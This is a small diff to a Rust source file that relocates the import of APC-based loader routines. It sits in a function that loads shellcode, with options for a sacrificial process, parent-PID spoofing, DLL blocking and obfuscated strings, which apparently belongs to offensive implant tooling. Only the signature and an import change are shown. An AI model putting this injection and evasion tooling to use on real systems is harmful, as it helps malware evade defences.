@@ -2,7 +2,7 @@ use obfstr::obfstr;
 
 #[cfg(feature = "prebuild")]
 pub unsafe fn loader(bin: Vec<u8>, is_need_sacrifice: bool, sacrifice_commandline: *mut i8, ppid: u32, block_dll: bool, need_output: bool) -> Result<Vec<u8>, String> {
-    use crate::win::kit::{ApcLoaderInline, ApcLoaderSacriface};
+    use crate::win::kit::bindings::{ApcLoaderInline, ApcLoaderSacriface};
     if bin.is_empty() {
         return Err(obfstr!("empty shellcode").to_string());
     }
